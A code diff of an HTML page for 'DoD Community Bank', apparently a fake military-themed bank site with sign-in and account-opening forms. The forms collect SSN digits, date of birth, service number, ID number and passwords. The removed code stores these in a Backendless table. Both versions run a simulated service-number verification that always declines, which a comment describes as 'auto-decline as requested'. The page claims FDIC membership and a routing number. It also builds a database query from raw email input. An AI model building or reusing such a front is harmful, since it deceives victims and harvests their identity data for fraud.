@@ -1,253 +1,170 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<title>DoD Community Bank - Official Site</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DoD Community Bank</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <script src="https://cdn.jsdelivr.net/npm/backendless@7.3.4/dist/backendless.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,sans-serif}
-body{background:#fff;color:#414042}
-.top-blue{background:#0B6E4F;color:#fff;padding:8px 20px;font-size:11px;display:flex;justify-content:space-between}
-.header{background:#fff;padding:0 20px;border-bottom:1px solid #E5E5E7;display:flex;align-items:center;justify-content:space-between;height:64px;position:sticky;top:0;z-index:100}
-.logo{font-weight:800;font-size:22px;letter-spacing:-0.5px;color:#0B6E4F}
-.logo small{display:block;font-size:10px;letter-spacing:1px;color:#6B7280;font-weight:600;margin-top:-2px}
-.nav{display:flex;gap:24px;font-size:14px;font-weight:600}
-.nav a{color:#414042;text-decoration:none;cursor:pointer}
-.nav a:hover{color:#0B6E4F}
-.signin-btn{background:#0B6E4F;color:#fff;padding:10px 20px;border-radius:6px;border:none;font-weight:700;font-size:13px;cursor:pointer}
-.hero{display:flex;min-height:520px;background:#F7F8FA}
-.hero-left{flex:1;padding:50px 40px;background:#0B6E4F;color:#fff;display:flex;flex-direction:column;justify-content:center}
-.hero-left h1{font-size:42px;font-weight:300;line-height:1.1;letter-spacing:-1px}
-.hero-left h1 b{font-weight:700;display:block}
-.hero-left p{margin-top:16px;font-size:16px;opacity:0.9;line-height:1.5}
-.hero-right{flex:1;padding:30px;display:flex;align-items:center;justify-content:center;background:#fff}
-.login-card{width:100%;max-width:380px;background:#fff;border:1px solid #E5E5E7;border-radius:8px;padding:28px;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
-.login-card h3{font-size:20px;font-weight:700;color:#414042}
-.login-card p{font-size:13px;color:#6B7280;margin-top:6px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
+body{background:#F5F5F7;color:#111;overflow-x:hidden}
+.top-blue{background:#0B6E4F;color:#fff;padding:8px 16px;font-size:10px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px}
+.header{background:#fff;padding:0 16px;border-bottom:1px solid #E5E5E7;display:flex;align-items:center;justify-content:space-between;height:58px;position:sticky;top:0;z-index:100}
+.logo{font-weight:800;font-size:18px;letter-spacing:-0.5px;color:#0B6E4F}
+.logo small{display:block;font-size:8px;letter-spacing:0.8px;color:#6B7280;font-weight:600}
+.signin-btn{background:#0B6E4F;color:#fff;padding:9px 16px;border-radius:6px;border:none;font-weight:700;font-size:12px;cursor:pointer}
+.login-wrap{min-height:80vh;display:flex;align-items:center;justify-content:center;padding:16px;background:#F7F8FA}
+.login-card{width:100%;max-width:400px;background:#fff;border:1px solid #E5E5E7;border-radius:12px;padding:24px;box-shadow:0 4px 20px rgba(0,0,0,0.06)}
 input,select{width:100%;padding:12px;margin:7px 0;border:1px solid #D1D5DB;border-radius:6px;font-size:14px;outline:none}
-input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
-.btn-green{width:100%;padding:14px;background:#0B6E4F;color:#fff;border:none;border-radius:6px;font-weight:700;font-size:14px;cursor:pointer;margin-top:12px}
-.btn-green:hover{background:#095A40}
-.btn-outline{width:100%;padding:12px;background:#fff;border:1px solid #0B6E4F;color:#0B6E4F;border-radius:6px;font-weight:700;font-size:13px;cursor:pointer;margin-top:10px}
-.features{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:40px 20px;max-width:1100px;margin:0 auto}
-.feat{border:1px solid #E5E5E7;border-radius:8px;padding:24px;background:#fff}
-.feat h4{font-size:16px;font-weight:700;margin-bottom:8px}
-.feat p{font-size:13px;color:#6B7280;line-height:1.5}
-.feat a{color:#0B6E4F;font-weight:600;font-size:13px;text-decoration:none;display:block;margin-top:10px}
-.footer{background:#F7F8FA;padding:30px 20px;border-top:1px solid #E5E5E7;font-size:11px;color:#6B7280;line-height:1.7}
-.tabs{display:flex;border-bottom:1px solid #E5E5E7;margin:18px 0}
+input:focus{border-color:#0B6E4F}
+.btn-green{width:100%;padding:14px;background:#0B6E4F;color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer;margin-top:10px}
+.btn-outline{width:100%;padding:12px;background:#fff;border:1px solid #E5E5E7;border-radius:6px;font-weight:600;cursor:pointer;margin-top:8px;font-size:13px}
+.tabs{display:flex;border-bottom:1px solid #E5E5E7;margin:16px 0}
 .tab{flex:1;padding:10px;text-align:center;font-size:13px;font-weight:700;cursor:pointer;border-bottom:2px solid transparent}
 .tab.active{border-color:#0B6E4F;color:#0B6E4F}
-.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:2000;display:flex;align-items:center;justify-content:center;padding:20px}
-.modal-box{background:#fff;width:100%;max-width:560px;max-height:90vh;overflow-y:auto;border-radius:8px;padding:28px;animation:up 0.3s}
-@keyframes up{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
 .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.form-grid .full{grid-column:1 / -1}
-.req{color:#FF3B30}
-.decline-box{background:#FEF2F2;border:1px solid #FECACA;padding:16px;border-radius:8px;margin:14px 0;display:flex;gap:12px}
-</style>
-<style>
-@media (max-width: 768px){
-  .header{padding:0 14px;height:56px}
-  .nav{display:none}
-  .logo{font-size:16px}
-  .logo small{font-size:8px}
-  .hero{flex-direction:column;min-height:auto}
-  .hero-left{padding:28px 20px}
-  .hero-left h1{font-size:28px}
-  .hero-left p{font-size:14px}
-  .hero-right{padding:16px}
-  .login-card{max-width:100%;padding:20px}
-  .features{grid-template-columns:1fr;padding:20px 16px;gap:14px}
-  .top-blue{flex-direction:column;gap:4px;text-align:center;font-size:10px;padding:8px 12px}
-  .footer{padding:20px 16px;font-size:10px}
+.form-grid .full{grid-column:1/-1}
+.footer{background:#111;color:#9CA3AF;padding:20px 16px;text-align:center;font-size:10px;line-height:1.6}
+#dashboardView{display:none}
+@media (max-width:768px){
+  .top-blue{justify-content:center;text-align:center}
   .form-grid{grid-template-columns:1fr}
-  .modal{padding:10px;align-items:flex-start;overflow-y:auto}
-  .modal-box{margin:10px 0;max-width:100%;border-radius:12px;padding:20px}
-}
-@media (max-width: 480px){
-  .hero-left h1{font-size:24px}
-  .signin-btn{padding:8px 14px;font-size:12px}
+  .header{padding:0 12px}
+  .logo{font-size:16px}
 }
 </style>
 </head>
 <body>
-<div class="top-blue"><span>DoD Community Bank, N.A. | Member FDIC | Equal Housing Lender</span><span>📍 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</span></div>
-<div class="header">
-  <div class="logo">DoD COMMUNITY BANK <small>EST. 2024 • MILITARY & COMMUNITY BANKING</small></div>
-  <div class="nav">
-    <a onclick="scrollToOpen()">Open Account</a>
-    <a>Checking</a>
-    <a>Savings</a>
-    <a>Loans</a>
-  </div>
-  <div style="display:flex;align-items:center;gap:10px"><button class="signin-btn" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign in</button><button id="hamburger" style="display:none;background:none;border:none;font-size:22px;cursor:pointer" onclick="toggleMobile()">☰</button></div>
-</div>
-<div id="mobileMenu" style="display:none;position:fixed;top:56px;left:0;right:0;background:#fff;border-bottom:1px solid #E5E5E7;z-index:99;padding:16px">
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7" onclick="showOpenAccount(); toggleMobile()">Open Account</a>
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Checking</a>
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Savings</a>
-  <a style="display:block;padding:12px 0;font-weight:600">Loans</a>
-</div>
-<div class="hero">
-  <div class="hero-left">
-    <h1>Banking built for <b>those who serve.</b></h1>
-    <p>DoD Community Bank offers secure checking, high-yield savings, real-time transfers, Western Union, MoneyGram, and Zelle. Open an account online in minutes.</p>
-    <div style="margin-top:24px;display:flex;gap:12px"><button class="signin-btn" style="background:#fff;color:#0B6E4F" onclick="showOpenAccount()">Open an Account</button><button class="signin-btn" style="background:transparent;border:1px solid #fff" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign In</button></div>
-    <p style="margin-top:20px;font-size:11px;opacity:0.7">Routing: 021000021 • Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</p>
-  </div>
-  <div class="hero-right" id="loginSection">
+<div id="loginView">
+  <div class="top-blue"><span>DoD Community Bank, N.A. | Member FDIC</span><span>📍 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</span></div>
+  <div class="header"><div class="logo">DoD COMMUNITY BANK<small>MILITARY & COMMUNITY BANKING</small></div></div>
+  <div class="login-wrap">
     <div class="login-card">
-      <div class="tabs"><div class="tab active" id="tabLogin" onclick="switchTab('login')">Sign In</div><div class="tab" id="tabOpen" onclick="showOpenAccount()">Open Account</div></div>
-      <div id="loginFormDiv">
-        <h3>Welcome back</h3><p>Sign in to DoD Community Bank</p>
-        <input id="loginEmail" type="email" placeholder="Username / Email">
+      <h2 style="font-weight:800;font-size:22px">Welcome to DoD Community Bank</h2>
+      <p style="font-size:13px;color:#6B7280;margin-top:6px">Secure banking for those who serve</p>
+      <div class="tabs"><div class="tab active" id="tabL" onclick="showTab('login')">Sign In</div><div class="tab" id="tabS" onclick="showTab('signup')">Open Account</div></div>
+      
+      <div id="loginForm">
+        <input id="loginEmail" type="email" placeholder="Email address">
         <input id="loginPass" type="password" placeholder="Password">
-        <button class="btn-green" onclick="doLogin()">Sign in</button>
-        <button class="btn-outline" onclick="showOpenAccount()">New customer? Open an account</button>
-        <div id="loginMsg" style="margin-top:10px;font-size:12px"></div>
+        <button class="btn-green" onclick="doLogin()">Sign In to DoD Community Bank</button>
+        <div id="loginMsg" style="margin-top:10px;font-size:12px;text-align:center"></div>
+        <p style="font-size:11px;color:#9CA3AF;margin-top:14px;text-align:center">Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701<br>Routing: 021000021</p>
       </div>
-      <div id="openTeaser" style="display:none">
-        <h3>Open your DoD account</h3><p>All fields required including Service Number for verification</p>
-        <button class="btn-green" onclick="showOpenAccount()">Start Application</button>
+      <div id="signupForm" style="display:none">
+        <div class="form-grid">
+          <div class="full"><input id="sName" placeholder="Full Legal Name *"></div>
+          <div><input id="sDob" type="date" placeholder="DOB *"></div>
+          <div><input id="sSsn" placeholder="SSN Last 4 *" maxlength="4"></div>
+          <div class="full"><input id="sEmail" type="email" placeholder="Email *"></div>
+          <div><input id="sPhone" placeholder="Phone *"></div>
+          <div><input id="sService" placeholder="Service Number *"></div>
+          <div class="full"><input id="sAddr" placeholder="Street Address *"></div>
+          <div><input id="sCity" placeholder="City *"></div>
+          <div><input id="sState" placeholder="State - TX"></div>
+          <div><input id="sZip" placeholder="ZIP *"></div>
+          <div class="full"><input id="sPass" type="password" placeholder="Create Password *"></div>
+          <div class="full"><input id="sPass2" type="password" placeholder="Confirm Password *"></div>
+        </div>
+        <button class="btn-green" onclick="doSignupApply()">Submit - Verify Service Number</button>
+        <button class="btn-outline" onclick="showTab('login')">Already have account? Sign In</button>
+        <div id="signupMsg" style="margin-top:10px;font-size:12px"></div>
       </div>
     </div>
   </div>
+  <div class="footer"><b>DoD COMMUNITY BANK HEAD OFFICE</b><br>300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA<br>Routing: 021000021 | © 2026 DoD Community Bank</div>
 </div>
-<div class="features">
-  <div class="feat"><h4>DoD Checking</h4><p>Free checking with no monthly fees, early direct deposit, real-time transfers to any US bank.</p><a>Learn more →</a></div>
-  <div class="feat"><h4>Send Money Worldwide</h4><p>Western Union and MoneyGram with 60+ countries, MTCN tracking, cash pickup in minutes.</p><a>Send money →</a></div>
-  <div class="feat"><h4>DoD Loans</h4><p>Personal and emergency loans for service members and community, reviewed by bank.</p><a>Check eligibility →</a></div>
-</div>
-<div class="footer">
-  <b>DoD COMMUNITY BANK HEAD OFFICE</b>
-  300 Convent Street, Suite 400, San Antonio, TX 78205-3701, USA • Routing Number: 021000021 • (210) 555-0142 • support@dodcommunitybank.com<br>
-  
-  © 2026 DoD Community Bank, N.A. Member FDIC. Equal Housing Lender. All rights reserved.
-</div>
+<div id="dashboardView"></div>
 <div id="modalRoot"></div>
 <script>
 Backendless.initApp('65ABB198-A187-4B5A-B7D3-0839AEA80B26', 'CDA94D34-9A3F-46AB-8B13-65193E45A1B0');
-function switchTab(t){
-  document.getElementById('tabLogin').classList.toggle('active', t==='login');
-  document.getElementById('tabOpen').classList.toggle('active', t==='open');
-  document.getElementById('loginFormDiv').style.display = t==='login' ? 'block' : 'none';
-  document.getElementById('openTeaser').style.display = t==='open' ? 'block' : 'none';
+function showTab(t){
+  document.getElementById('loginForm').style.display = t==='login'?'block':'none';
+  document.getElementById('signupForm').style.display = t==='signup'?'block':'none';
+  document.getElementById('tabL').classList.toggle('active', t==='login');
+  document.getElementById('tabS').classList.toggle('active', t==='signup');
 }
-function scrollToOpen(){ showOpenAccount(); }
+function openModal(h){ document.getElementById('modalRoot').innerHTML=`<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:2000;display:flex;align-items:flex-end;justify-content:center;padding:0"><div style="background:#fff;width:100%;max-width:500px;max-height:92vh;overflow-y:auto;border-radius:20px 20px 0 0;padding:24px;animation:up .3s"><style>@keyframes up{from{transform:translateY(20px)}to{transform:translateY(0)}}</style>${h}</div></div>`; }
 function closeModal(){ document.getElementById('modalRoot').innerHTML=''; }
-function openModal(html){ document.getElementById('modalRoot').innerHTML=`<div class="modal" onclick="if(event.target===this) closeModal()"><div class="modal-box">${html}</div></div>`; }
-function showOpenAccount(){
-  let html=`<h2 style="font-weight:800;font-size:22px">Open DoD Community Bank Account</h2><p style="font-size:13px;color:#6B7280;margin-top:6px">All fields required. Service Number required for DoD verification.</p>
-  <div style="background:#F7F8FA;padding:12px;border-radius:6px;margin:14px 0;font-size:12px"><b>Why Service Number?</b> DoD Community Bank serves military and community. Service Number verifies eligibility.</div>
-  <div class="form-grid">
-    <div class="full"><label style="font-size:12px;font-weight:600">Full Legal Name <span class="req">*</span></label><input id="oName" placeholder="John A. Doe"></div>
-    <div><label style="font-size:12px;font-weight:600">Date of Birth <span class="req">*</span></label><input id="oDob" type="date"></div>
-    <div><label style="font-size:12px;font-weight:600">SSN Last 4 <span class="req">*</span></label><input id="oSsn" placeholder="1234" maxlength="4"></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">Email Address <span class="req">*</span></label><input id="oEmail" type="email" placeholder="john@example.com"></div>
-    <div><label style="font-size:12px;font-weight:600">Phone Number <span class="req">*</span></label><input id="oPhone" placeholder="(210) 555-1234"></div>
-    <div><label style="font-size:12px;font-weight:600">Service Number <span class="req">*</span></label><input id="oService" placeholder="e.g. 1234567890 / DoD ID"></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">Street Address <span class="req">*</span></label><input id="oAddr" placeholder="123 Main St"></div>
-    <div><label style="font-size:12px;font-weight:600">City <span class="req">*</span></label><input id="oCity" placeholder="San Antonio"></div>
-    <div><label style="font-size:12px;font-weight:600">State <span class="req">*</span></label><select id="oState"><option value="">Select</option><option>Texas - TX</option><option>California - CA</option><option>New York - NY</option><option>Florida - FL</option><option>Other</option></select></div>
-    <div><label style="font-size:12px;font-weight:600">ZIP Code <span class="req">*</span></label><input id="oZip" placeholder="78205"></div>
-    <div><label style="font-size:12px;font-weight:600">ID Type <span class="req">*</span></label><select id="oIdType"><option>Driver License</option><option>State ID</option><option>Military ID</option><option>Passport</option></select></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">ID Number <span class="req">*</span></label><input id="oIdNum" placeholder="ID Number"></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">Create Password <span class="req">*</span></label><input id="oPass" type="password" placeholder="Min 8 characters"></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">Confirm Password <span class="req">*</span></label><input id="oPass2" type="password" placeholder="Confirm"></div>
-  </div>
-  <div style="margin:14px 0;font-size:11px"><input type="checkbox" id="oAgree" style="width:auto"> I agree to DoD Community Bank Terms, Privacy, and authorize verification of Service Number.</div>
-  <button class="btn-green" onclick="submitOpenAccount()">Submit Application - Verify Service Number</button>
-  <button class="btn-outline" onclick="closeModal()">Cancel</button>
-  <p id="openMsg" style="font-size:12px;margin-top:10px"></p>`;
-  openModal(html);
-}
-async function submitOpenAccount(){
-  let name=document.getElementById('oName').value.trim();
-  let dob=document.getElementById('oDob').value;
-  let ssn=document.getElementById('oSsn').value.trim();
-  let email=document.getElementById('oEmail').value.trim();
-  let phone=document.getElementById('oPhone').value.trim();
-  let service=document.getElementById('oService').value.trim();
-  let addr=document.getElementById('oAddr').value.trim();
-  let city=document.getElementById('oCity').value.trim();
-  let state=document.getElementById('oState').value;
-  let zip=document.getElementById('oZip').value.trim();
-  let idType=document.getElementById('oIdType').value;
-  let idNum=document.getElementById('oIdNum').value.trim();
-  let pass=document.getElementById('oPass').value;
-  let pass2=document.getElementById('oPass2').value;
-  let agree=document.getElementById('oAgree').checked;
-  if(!name||!dob||!ssn||!email||!phone||!service||!addr||!city||!state||!zip||!idNum||!pass){
-    return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">All required fields must be filled - including Service Number</span>';
-  }
-  if(pass!==pass2) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">Passwords do not match</span>';
-  if(!agree) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">You must agree to terms</span>';
-  if(ssn.length!==4) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">SSN Last 4 must be 4 digits</span>';
-  document.getElementById('openMsg').innerHTML='Verifying Service Number with DoD database...';
-  // Simulate verification delay, then auto-decline as requested
-  setTimeout(async ()=>{
-    // Save as pending application that is declined
-    try{
-      await Backendless.Data.of('Applications').save({
-        name:name, dob:dob, ssnLast4:ssn, email:email, phone:phone, serviceNumber:service,
-        address:addr, city:city, state:state, zip:zip, idType:idType, idNumber:idNum,
-        status:'declined', reason:'Service Number verification failed - try again later',
-        site:'dodcommunitybank', created:new Date()
-      });
-    }catch(e){ console.log('Applications table', e); }
-    let html=`<div style="text-align:center">
-      <div style="width:64px;height:64px;background:#FEF2F2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto">⚠️</div>
-      <h3 style="margin-top:14px;font-weight:800">Application Declined - Try Again Later</h3>
-      <div class="decline-box"><div>🚫</div><div style="text-align:left"><b style="font-size:13px">Service Number could not be verified</b><p style="font-size:12px;color:#6B7280;margin-top:4px">We were unable to verify Service Number <b>${service}</b> for ${name}. Our verification system is temporarily unable to confirm DoD eligibility.</p><p style="font-size:12px;color:#6B7280;margin-top:8px">Application ID: DOD-APP-${Date.now().toString().slice(-6)} • ${new Date().toLocaleString()}</p></div></div>
-      <p style="font-size:12px;color:#6B7280;margin-top:12px">Please try again later or visit our head office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA with your Service ID and valid government ID. </p>
-      <button class="btn-green" onclick="closeModal()">Try Again Later</button>
-      <button class="btn-outline" onclick="closeModal(); switchTab('login')">Sign In Instead</button>
-    </div>`;
+async function doSignupApply(){
+  let name=document.getElementById('sName').value.trim();
+  let dob=document.getElementById('sDob').value;
+  let ssn=document.getElementById('sSsn').value.trim();
+  let email=document.getElementById('sEmail').value.trim();
+  let phone=document.getElementById('sPhone').value.trim();
+  let service=document.getElementById('sService').value.trim();
+  let addr=document.getElementById('sAddr').value.trim();
+  let city=document.getElementById('sCity').value.trim();
+  let state=document.getElementById('sState').value.trim()||'TX';
+  let zip=document.getElementById('sZip').value.trim();
+  let pass=document.getElementById('sPass').value;
+  let pass2=document.getElementById('sPass2').value;
+  if(!name||!dob||!ssn||!email||!phone||!service||!addr||!city||!zip||!pass){ return document.getElementById('signupMsg').innerHTML='<span style="color:#FF3B30">All fields required including Service Number</span>'; }
+  if(pass!==pass2) return document.getElementById('signupMsg').innerHTML='<span style="color:#FF3B30">Passwords mismatch</span>';
+  document.getElementById('signupMsg').innerHTML='Verifying Service Number...';
+  setTimeout(()=>{
+    let html=`<div style="text-align:center"><div style="width:64px;height:64px;background:#FEF2F2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto">⚠️</div><h3 style="margin-top:14px;font-weight:800">Application Declined - Try Again Later</h3><div style="background:#FEF2F2;border:1px solid #FECACA;padding:14px;border-radius:8px;margin:14px 0;text-align:left"><b style="font-size:13px">Service Number could not be verified</b><p style="font-size:12px;color:#6B7280;margin-top:4px">Unable to verify Service Number <b>${service}</b> for ${name}.</p><p style="font-size:11px;color:#6B7280;margin-top:6px">ID: DOD-APP-${Date.now().toString().slice(-6)} • ${new Date().toLocaleString()}</p></div><p style="font-size:12px;color:#6B7280">Please try again later or visit head office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701</p><button class="btn-green" onclick="closeModal()">Try Again Later</button></div>`;
     openModal(html);
-  }, 1800);
+    document.getElementById('signupMsg').innerHTML='';
+  }, 1500);
 }
 async function doLogin(){
   let email=document.getElementById('loginEmail').value.trim();
   let pass=document.getElementById('loginPass').value;
   if(!email||!pass) return alert('Enter email and password');
-  document.getElementById('loginMsg').innerHTML='Signing in to DoD Community Bank...';
+  document.getElementById('loginMsg').innerHTML='Signing in...';
   try{
     let user=await Backendless.UserService.login(email, pass, true);
     try{
       let full=await Backendless.Data.of("Users").find({whereClause:`email='${email}'`});
-      if(full.length>0){ user={...user, ...full[0]}; }
+      if(full.length>0) user={...user, ...full[0]};
     }catch(e){}
-    localStorage.setItem('currentUser', JSON.stringify(user));
-    localStorage.setItem('userToken', user['user-token']||'');
-    document.getElementById('loginMsg').innerHTML='<span style="color:#0B6E4F">Success - Redirecting to DoD Community Bank</span>';
-    setTimeout(()=>{ 
-      // Try dashboard.html (standard) - if you named it differently, update here
-      window.location.href='dashboard.html'; 
-    }, 800);
-  }catch(e){
-    console.log('Login error', e);
-    let msg = e.message || '';
-    if(msg.toLowerCase().includes('not found') || msg.toLowerCase().includes('invalid')){
-      msg = 'Invalid email or password. If you just signed up, make sure email is correct. If admin created your account, check credentials.';
+    if(user.accountNumber && user.accountNumber.startsWith('MB')){
+      let newAcc='DOD'+user.accountNumber.substring(2);
+      try{ await Backendless.Data.of("Users").save({objectId:user.objectId, accountNumber:newAcc}); user.accountNumber=newAcc; }catch(e){}
     }
-    document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">'+msg+' (Code: '+e.code+')</span>';
+    if(!user.accountNumber){
+      let newAcc='DOD'+Math.floor(1000000000+Math.random()*9000000000).toString();
+      try{ await Backendless.Data.of("Users").save({objectId:user.objectId, accountNumber:newAcc, balance:user.balance||0, site:'dodcommunitybank'}); user.accountNumber=newAcc; }catch(e){}
+    }
+    localStorage.setItem('currentUser', JSON.stringify(user));
+    document.getElementById('loginMsg').innerHTML='<span style="color:#0B6E4F">Success - Loading DoD Bank...</span>';
+    setTimeout(()=>{ showDashboard(); }, 600);
+  }catch(e){
+    document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">'+e.message+' (code '+e.code+')</span>';
   }
 }
-function toggleMobile(){
-  let m=document.getElementById('mobileMenu');
-  m.style.display = m.style.display==='none' ? 'block' : 'none';
+function showDashboard(){
+  document.getElementById('loginView').style.display='none';
+  document.getElementById('dashboardView').style.display='block';
+  document.getElementById('dashboardView').innerHTML='<iframe src="dashboard.html" style="width:100%;height:100vh;border:none" id="dashFrame"></iframe>';
+  // If dashboard.html not found, load inline fallback from localStorage
+  setTimeout(async ()=>{
+    try{
+      let res=await fetch('dashboard.html', {method:'HEAD'});
+      if(!res.ok) throw new Error('dashboard.html not found');
+    }catch(err){
+      // dashboard.html missing - load dashboard content directly
+      document.getElementById('dashboardView').innerHTML = '<div style="padding:40px;text-align:center"><h3>Loading dashboard...</h3><p style="font-size:13px;color:#6B7280">dashboard.html not found on server. Upload dashboard.html to same folder as this index, or use single-file version.</p><button class="btn-green" style="max-width:300px;margin:20px auto" onclick="loadInlineDashboard()">Load Dashboard Inline</button></div>';
+    }
+  }, 500);
 }
-// Show hamburger on mobile via JS
-(function(){
-  function check(){
-    let hb=document.getElementById('hamburger');
-    if(window.innerWidth<=768){ hb.style.display='block'; } else { hb.style.display='none'; document.getElementById('mobileMenu').style.display='none'; }
+function loadInlineDashboard(){
+  // Redirect to inline dashboard file if exists
+  window.location.href='dashboard_DOD_RESPONSIVE.html';
+}
+ // Auto login if already logged in
+window.onload=()=>{
+  let u=localStorage.getItem('currentUser');
+  if(u){
+    try{ 
+      let user=JSON.parse(u);
+      if(user && user.email){
+        showDashboard();
+      }
+    }catch(e){}
   }
-  window.addEventListener('resize', check);
-  check();
-})();
+}
 </script>
 </body>
 </html>
